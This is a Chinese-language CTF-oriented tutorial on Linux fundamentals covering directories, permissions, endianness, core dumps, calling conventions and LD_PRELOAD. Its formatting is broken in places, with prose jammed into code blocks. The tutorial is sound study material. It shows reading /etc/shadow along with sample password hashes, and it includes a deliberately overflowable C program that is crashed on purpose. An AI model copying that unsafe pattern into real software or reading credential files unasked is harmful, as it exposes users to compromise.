class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ uname -a</span><br><span class=\"line\">Linux manjaro 4.11.5-1-ARCH #1 SMP PREEMPT Wed Jun 14 16:19:27 CEST 2017 x86_64 GNU/Linux</span><br><span class=\"line\">$ ls -al /</span><br><span class=\"line\">drwxr-xr-x  17 root root  4096 Jun 28 20:17 .</span><br><span class=\"line\">drwxr-xr-x  17 root root  4096 Jun 28 20:17 ..</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 Aug 10 22:50 boot</span><br><span class=\"line\">drwxr-xr-x  20 root root  3140 Aug 11 11:43 dev</span><br><span class=\"line\">drwxr-xr-x 101 root root  4096 Aug 14 13:54 etc</span><br><span class=\"line\">drwxr-xr-x   3 root root  4096 Apr  8 19:59 home</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 lib -&gt; usr/lib</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 lib64 -&gt; usr/lib</span><br><span class=\"line\">drwx------   2 root root 16384 Apr  8 19:55 lost+found</span><br><span class=\"line\">drwxr-xr-x   2 root root  4096 Oct  1  2015 mnt</span><br><span class=\"line\">drwxr-xr-x  15 root root  4096 Jul 15 20:10 opt</span><br><span class=\"line\">dr-xr-xr-x 267 root root     0 Aug  3 09:41 proc</span><br><span class=\"line\">drwxr-x---   9 root root  4096 Jul 22 22:59 root</span><br><span class=\"line\">drwxr-xr-x  26 root root   660 Aug 14 21:08 run</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 sbin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 May 28 22:07 srv</span><br><span class=\"line\">dr-xr-xr-x  13 root root     0 Aug  3 09:41 sys</span><br><span class=\"line\">drwxrwxrwt  36 root root  1060 Aug 14 21:27 tmp</span><br><span class=\"line\">drwxr-xr-x  11 root root  4096 Aug 14 13:54 usr</span><br><span class=\"line\">drwxr-xr-x  12 root root  4096 Jun 28 20:17 var</span><br></pre></td></tr></table></figure>\n\n<p>由于不同的发行版会有略微的不同，我们这里使用的是基于 Arch 的发行版 Manjaro，以上就是根目录下的内容，我们介绍几个重要的目录： - <code>/bin</code>、<code>/sbin</code>：链接到 <code>/usr/bin</code>，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。 - <code>/boot</code>：操作系统启动时要用到的程序。 - <code>/dev</code>：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。 - <code>/etc</code>：存放系统管理时要用到的各种配置文件和子目录。 - <code>/etc/rc.d</code>：存放 Linux 启动和关闭时要用到的脚本。 - <code>/home</code>：普通用户的主目录。 - <code>/lib</code>、<code>/lib64</code>：链接到 <code>/usr/lib</code>，存放系统及软件需要的动态链接共享库。 - <code>/mnt</code>：这个目录让用户可以临时挂载其他的文件系统。 - <code>/proc</code>：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。 - <code>/root</code>：系统管理员的主目录。 - <code>/srv</code>：存放一些服务启动之后需要提取的数据。 - <code>/sys</code>：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。 - <code>/tmp</code>：公用的临时文件存放目录。 - <code>/usr</code>：应用程序和文件几乎都在这个目录下。 - <code>/usr/src</code>：内核源代码的存放目录。 - <code>/var</code>：存放了很多服务的日志信息。</p>\n<h2 id=\"进程管理\"><a href=\"#进程管理\" class=\"headerlink\" title=\"进程管理\"></a>进程管理</h2><ul>\n<li>top</li>\n<li>可以实时动态地查看系统的整体运行情况。</li>\n<li>ps</li>\n<li>用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。</li>\n<li>查看某进程的状态：<code>$ ps -aux | grep [file]</code>，其中返回内容最左边的数字为进程号（PID）。</li>\n<li>kill</li>\n<li>用来删除执行中的程序或工作。</li>\n<li>删除进程某 PID 指定的进程：<code>$ kill [PID]</code></li>\n</ul>\n<h2 id=\"UID-和-GID\"><a href=\"#UID-和-GID\" class=\"headerlink\" title=\"UID 和 GID\"></a>UID 和 GID</h2><p>Linux 是一个支持多用户的操作系统，每个用户都有 User ID(UID) 和 Group ID(GID)，UID  是对一个用户的单一身份标识，而 GID 则对应多个 UID。知道某个用户的 UID 和 GID 是非常有用的，一些程序可能就需要 UID/GID 来运行。可以使用 <code>id</code> 命令来查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ id root</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)</span><br><span class=\"line\">$ id firmy</span><br><span class=\"line\">uid=1000(firmy) gid=1000(firmy) groups=1000(firmy),3(sys),7(lp),10(wheel),90(network),91(video),93(optical),95(storage),96(scanner),98(power),56(bumblebee)</span><br></pre></td></tr></table></figure>\n\n<p>UID 为 0 的 root 用户类似于系统管理员，它具有系统的完全访问权。我自己新建的用户 firmy，其 UID 为 1000，是一个普通用户。GID 的关系存储在 <code>/etc/group</code> 文件中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat /etc/group</span><br><span class=\"line\">root:x:0:root</span><br><span class=\"line\">bin:x:1:root,bin,daemon</span><br><span class=\"line\">daemon:x:2:root,bin,daemon</span><br><span class=\"line\">sys:x:3:root,bin,firmy</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>所有用户的信息（除了密码）都保存在 <code>/etc/passwd</code> 文件中，而为了安全起见，加密过的用户密码保存在 <code>/etc/shadow</code> 文件中，此文件只有 root 权限可以访问。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo cat /etc/shadow</span><br><span class=\"line\">root:$6$root$wvK.pRXFEH80GYkpiu1tEWYMOueo4tZtq7mYnldiyJBZDMe.mKwt.WIJnehb4bhZchL/93Oe1ok9UwxYf79yR1:17264::::::</span><br><span class=\"line\">firmy:$6$firmy$dhGT.WP91lnpG5/10GfGdj5L1fFVSoYlxwYHQn.llc5eKOvr7J8nqqGdVFKykMUSDNxix5Vh8zbXIapt0oPd8.:17264:0:99999:7:::</span><br></pre></td></tr></table></figure>\n\n<p>由于普通用户的权限比较低，这里使用 <code>sudo</code> 命令可以让普通用户以 root 用户的身份运行某一命令。使用 <code>su</code> 命令则可以切换到一个不同的用户：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ whoami</span><br><span class=\"line\">firmy</span><br><span class=\"line\">$ su root</span><br><span class=\"line\"># whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p><code>whoami</code> 用于打印当前有效的用户名称，shell 中普通用户以 <code>$</code> 开头，root 用户以 <code>#</code> 开头。在输入密码后，我们已经从 firmy 用户转换到 root 用户了。</p>\n<h2 id=\"权限设置\"><a href=\"#权限设置\" class=\"headerlink\" title=\"权限设置\"></a>权限设置</h2><p>在Linux 中，文件或目录权限的控制分别以读取、写入、执行 3 种一般权限来区分，另有 3 种特殊权限可供运用。</p>\n<p>使用 <code>ls -l [file]</code> 来查看某文件或目录的信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ls -l /</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 Jul 28 08:48 boot</span><br><span class=\"line\">-rw-r--r--   1 root root 18561 Apr  2 22:48 desktopfs-pkgs.txt</span><br></pre></td></tr></table></figure>\n\n<p>第一栏从第二个字母开始就是权限字符串，权限表示三个为一组，依次是所有者权限、组权限、其他人权限。每组的顺序均为 <code>rwx</code>，如果有相应权限，则表示成相应字母，如果不具有相应权限，则用 <code>-</code> 表示。 - <code>r</code>：读取权限，数字代号为 “4” - <code>w</code>：写入权限，数字代号为 “2” - <code>x</code>：执行或切换权限，数字代号为 “1”</p>\n<p>通过第一栏的第一个字母可知，第一行是一个链接文件 （<code>l</code>），第二行是个目录（<code>d</code>），第三行是个普通文件（<code>-</code>）。</p>\n<p>用户可以使用 <code>chmod</code> 指令去变更文件与目录的权限。权限范围被指定为所有者（<code>u</code>）、所属组（<code>g</code>）、其他人（<code>o</code>）和所有人（<code>a</code>）。 - -R：递归处理，将指令目录下的所有文件及子目录一并处理； - &lt;权限范围&gt;+&lt;权限设置&gt;：开启权限范围的文件或目录的该选项权限设置 - <code>$ chmod a+r [file]</code>：赋予所有用户读取权限 - &lt;权限范围&gt;-&lt;权限设置&gt;：关闭权限范围的文件或目录的该选项权限设置 - <code>$ chmod u-w [file]</code>：取消所有者写入权限 - &lt;权限范围&gt;=&lt;权限设置&gt;：指定权限范围的文件或目录的该选项权限设置； - <code>$ chmod g=x [file]</code>：指定组权限为可执行 - <code>$ chmod o=rwx [file]</code>：制定其他人权限为可读、可写和可执行</p>\n<p><img src=\"http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_file.png\" alt=\"img\"></p>\n<h2 id=\"字节序\"><a href=\"#字节序\" class=\"headerlink\" title=\"字节序\"></a>字节序</h2><p>目前计算机中采用两种字节存储机制：大端（Big-endian）和小端（Little-endian）。</p>\n<blockquote>\n<p>MSB (Most Significan Bit/Byte)：最重要的位或最重要的字节。</p>\n<p>LSB (Least Significan Bit/Byte)：最不重要的位或最不重要的字节。</p>\n</blockquote>\n<p>Big-endian 规定 MSB 在存储时放在低地址，在传输时放在流的开始；LSB  存储时放在高地址，在传输时放在流的末尾。Little-endian 则相反。常见的 Intel 处理器使用 Little-endian，而  PowerPC 系列处理器则使用 Big-endian，另外 TCP/IP 协议和 Java 虚拟机的字节序也是 Big-endian。</p>\n<p>例如十六进制整数 0x12345678 存入以 1000H 开始的内存中：</p>\n<p><img src=\"http://study.ctfcaict.com/media/course/html/3/site/linux/pic/1.3_byte_order.png\" alt=\"img\"></p>\n<p>我们在内存中实际地看一下，在地址 <code>0xffffd584</code> 处有字符 <code>1234</code>，在地址 <code>0xffffd588</code> 处有字符 <code>5678</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ x/w 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x34333231</span><br><span class=\"line\">gdb-peda$ x/4wb 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x31    0x32    0x33    0x34</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x31\\x32\\x33\\x34&#x27;)</span><br><span class=\"line\">1234</span><br><span class=\"line\"></span><br><span class=\"line\">gdb-peda$ x/w 0xffffd588</span><br><span class=\"line\">0xffffd588:     0x38373635</span><br><span class=\"line\">gdb-peda$ x/4wb 0xffffd588</span><br><span class=\"line\">0xffffd588:     0x35    0x36    0x37    0x38</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x35\\x36\\x37\\x38&#x27;)</span><br><span class=\"line\">5678</span><br><span class=\"line\"></span><br><span class=\"line\">gdb-peda$ x/2w 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x34333231      0x38373635</span><br><span class=\"line\">gdb-peda$ x/8wb 0xffffd584</span><br><span class=\"line\">0xffffd584:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38</span><br><span class=\"line\">gdb-peda$ python print(&#x27;\\x31\\x32\\x33\\x34\\x35\\x35\\x36\\x37\\x38&#x27;)</span><br><span class=\"line\">123455678</span><br><span class=\"line\">db-peda$ x/s 0xffffd584</span><br><span class=\"line\">0xffffd584:     &quot;12345678&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"输入输出\"><a href=\"#输入输出\" class=\"headerlink\" title=\"输入输出\"></a>输入输出</h2><ul>\n<li>使用命令的输出作为可执行文件的输入参数</li>\n<li><code>$ ./vulnerable &#39;your_command_here&#39;</code></li>\n<li><code>$ ./vulnerable $(your_command_here)</code></li>\n<li>使用命令作为输入</li>\n<li><code>$ your_command_here | ./vulnerable</code></li>\n<li>将命令行输出写入文件</li>\n<li><code>$ your_command_here &gt; filename</code></li>\n<li>使用文件作为输入</li>\n<li><code>$ ./vulnerable &lt; filename</code></li>\n</ul>\n<h2 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a>文件描述符</h2><p>在 Linux 系统中一切皆可以看成是文件，文件又分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核管理已被打开的文件所创建的索引，使用一个非负整数来指代被打开的文件。</p>\n<p>标准文件描述符如下：</p>\n<table>\n<thead>\n<tr>\n<th>文件描述符</th>\n<th>用途</th>\n<th>stdio 流</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>标准输入</td>\n<td>stdin</td>\n</tr>\n<tr>\n<td>1</td>\n<td>标准输出</td>\n<td>stdout</td>\n</tr>\n<tr>\n<td>2</td>\n<td>标准错误</td>\n<td>stderr</td>\n</tr>\n</tbody></table>\n<p>当一个程序使用 <code>fork()</code> 生成一个子进程后，子进程会继承父进程所打开的文件表，此时，父子进程使用同一个文件表，这可能导致一些安全问题。如果使用 <code>vfork()</code>，子进程虽然运行于父进程的空间，但拥有自己的进程表项。</p>\n<h2 id=\"核心转储\"><a href=\"#核心转储\" class=\"headerlink\" title=\"核心转储\"></a>核心转储</h2><p>当程序运行的过程中异常终止或崩溃，操作系统会将程序当时的内存、寄存器状态、堆栈指针、内存管理信息等记录下来，保存在一个文件中，这种行为就叫做核心转储（Core Dump）。</p>\n<h4 id=\"会产生核心转储的信号\"><a href=\"#会产生核心转储的信号\" class=\"headerlink\" title=\"会产生核心转储的信号\"></a>会产生核心转储的信号</h4><table>\n<thead>\n<tr>\n<th>Signal</th>\n<th>Action</th>\n<th>Comment</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SIGQUIT</td>\n<td>Core</td>\n<td>Quit from keyboard</td>\n</tr>\n<tr>\n<td>SIGILL</td>\n<td>Core</td>\n<td>Illegal Instruction</td>\n</tr>\n<tr>\n<td>SIGABRT</td>\n<td>Core</td>\n<td>Abort signal from abort</td>\n</tr>\n<tr>\n<td>SIGSEGV</td>\n<td>Core</td>\n<td>Invalid memory reference</td>\n</tr>\n<tr>\n<td>SIGTRAP</td>\n<td>Core</td>\n<td>Trace/breakpoint trap</td>\n</tr>\n</tbody></table>\n<h4 id=\"开启核心转储\"><a href=\"#开启核心转储\" class=\"headerlink\" title=\"开启核心转储\"></a>开启核心转储</h4><ul>\n<li><p>输入命令 <code>ulimit -c</code>，输出结果为 <code>0</code>，说明默认是关闭的。</p>\n</li>\n<li><p>输入命令 <code>ulimit -c unlimited</code> 即可在当前终端开启核心转储功能。</p>\n</li>\n<li><p>如果想让核心转储功能永久开启，可以修改文件 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/security/limits.conf</span><br></pre></td></tr></table></figure>\n\n<p>，增加一行：  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&lt;domain&gt;      &lt;type&gt;  &lt;item&gt;         &lt;value&gt;</span><br><span class=\"line\">*               soft    core            unlimited</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h4 id=\"修改转储文件保存路径\"><a href=\"#修改转储文件保存路径\" class=\"headerlink\" title=\"修改转储文件保存路径\"></a>修改转储文件保存路径</h4><ul>\n<li>```<br>/proc/sys/kernel/core_uses_pid<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">，可以使生成的核心转储文件名变为 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\ncore.[pid]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">的模式。  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"echo-1-gt-proc-sys-kernel-core-uses-pid\"><a href=\"#echo-1-gt-proc-sys-kernel-core-uses-pid\" class=\"headerlink\" title=\"echo 1 &gt; /proc/sys/kernel/core_uses_pid\"></a>echo 1 &gt; /proc/sys/kernel/core_uses_pid</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 还可以修改 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n/proc/sys/kernel/core_pattern<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">来控制生成核心转储文件的保存位置和文件名格式。  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"echo-tmp-core-e-p-t-gt-proc-sys-kernel-core-pattern\"><a href=\"#echo-tmp-core-e-p-t-gt-proc-sys-kernel-core-pattern\" class=\"headerlink\" title=\"echo /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern\"></a>echo /tmp/core-%e-%p-%t &gt; /proc/sys/kernel/core_pattern</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">此时生成的文件保存在 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n/tmp/<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">目录下，文件名格式为 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\ncore-[filename]-[pid]-[time]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### 使用 gdb 调试核心转储文件</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ gdb [filename] [core file]<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### 例子</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ cat core.c<br>#include &lt;stdio.h&gt;<br>void main(int argc, char **argv) {<br>  char buf[5];<br>  scanf(“%s”, buf);<br>}<br>$ gcc -m32 -fno-stack-protector core.c<br>$ ./a.out<br>AAAAAAAAAAAAAAAAAAAA<br>Segmentation fault (core dumped)<br>$ file /tmp/core-a.out-12444-1503198911<br>/tmp/core-a.out-12444-1503198911: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV), SVR4-style, from ‘./a.out’, real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: ‘./a.out’, platform: ‘i686’<br>$ gdb a.out /tmp/core-a.out-12444-1503198911 -q<br>Reading symbols from a.out…(no debugging symbols found)…done.<br>[New LWP 12444]<br>Core was generated by `./a.out’.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br>#0  0x5655559b in main ()<br>gdb-peda$ info frame<br>Stack level 0, frame at 0x41414141:<br>eip = 0x5655559b in main; saved eip = <not saved><br>Outermost frame: Cannot access memory at address 0x4141413d<br>Arglist at 0x41414141, args:<br>Locals at 0x41414141, Previous frame’s sp is 0x41414141<br>Cannot access memory at address 0x4141413d<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## 调用约定</span><br><span class=\"line\"></span><br><span class=\"line\">函数调用约定是对函数调用时如何传递参数的一种约定。关于它的约定有许多种，下面我们分别从内核接口和用户接口介绍 32 位和 64 位 Linux 的调用约定。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 内核接口</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-32 系统调用约定**：Linux 系统调用使用寄存器传递参数。`eax` 为 syscall_number，`ebx`、`ecx`、`edx`、`esi`、`ebp` 用于将 6 个参数传递给系统调用。返回值保存在 `eax` 中。所有其他寄存器（包括 EFLAGS）都保留在 `int 0x80` 中。</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-64 系统调用约定**：内核接口使用的寄存器有：`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。系统调用通过 `syscall` 指令完成。除了 `rcx`、`r11` 和 `rax`，其他的寄存器都被保留。系统调用的编号必须在寄存器 `rax` 中传递。系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。返回时，`rax` 中包含了系统调用的结果。而且只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 用户接口</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-32 函数调用约定**：参数通过栈进行传递。最后一个参数第一个被放入栈中，直到所有的参数都放置完毕，然后执行 call 指令。这也是 Linux 上 C 语言函数的方式。</span><br><span class=\"line\"></span><br><span class=\"line\">**x86-64 函数调用约定**：x86-64 下通过寄存器传递参数，这样做比通过栈有更高的效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数的类型是 MEMORY，则在栈上传递参数。如果类型是 INTEGER，则顺序使用 `rdi`、`rsi`、`rdx`、`rcx`、`r8` 和 `r9`。所以如果有多于 6 个的 INTEGER 参数，则后面的参数在栈上传递。</span><br><span class=\"line\"></span><br><span class=\"line\">## 环境变量</span><br><span class=\"line\"></span><br><span class=\"line\">- 按照生命周期划分</span><br><span class=\"line\">- 永久环境变量：修改相关配置文件，永久生效。</span><br><span class=\"line\">- 临时环境变量：使用 `export` 命令，在当前终端下生效，关闭终端后失效。</span><br><span class=\"line\">- 按照作用域划分</span><br><span class=\"line\">- 系统环境变量：对该系统中所有用户生效。</span><br><span class=\"line\">- 用户环境变量：对特定用户生效。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 设置方法</span><br><span class=\"line\"></span><br><span class=\"line\">1. 在文件 `/etc/profile` 中添加变量，这种方法对所有用户永久生效。如：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"Set-our-default-path\"><a href=\"#Set-our-default-path\" class=\"headerlink\" title=\"Set our default path\"></a>Set our default path</h1> PATH=”/usr/local/sbin:/usr/local/bin:/usr/bin”<br> export PATH <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">添加后执行命令 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n source /etc/profile <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">    使其生效。</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">2. 在文件 `~/.bash_profile` 中添加变量，这种方法对当前用户永久生效。其余同上。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 直接运行命令 `export` 定义变量，这种方法只对当前终端临时生效。</span><br><span class=\"line\"></span><br><span class=\"line\">#### 常用变量</span><br><span class=\"line\"></span><br><span class=\"line\">使用命令 `echo` 打印变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl<br>$ echo $HOME<br>/home/firmy<br>$ echo $LOGNAME<br>firmy<br>$ echo $HOSTNAME<br>firmy-pc<br>$ echo $SHELL<br>/bin/bash<br>$ echo $LANG<br>en_US.UTF-8<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `env` 可以打印出所有环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ env<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `set` 可以打印处所有本地定义的 shell 变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ set<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">使用命令 `unset` 可以清楚环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ unset $变量名<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### LD_PRELOAD</span><br><span class=\"line\"></span><br><span class=\"line\">该环境变量可以定义在程序运行前优先加载的动态链接库。在 pwn 题目中，我们可能需要一个特定的 libc，这时就可以定义该变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ LD_PRELOAD=/path/to/libc.so ./binary<figure class=\"highlight plaintext\"><table><tr><td 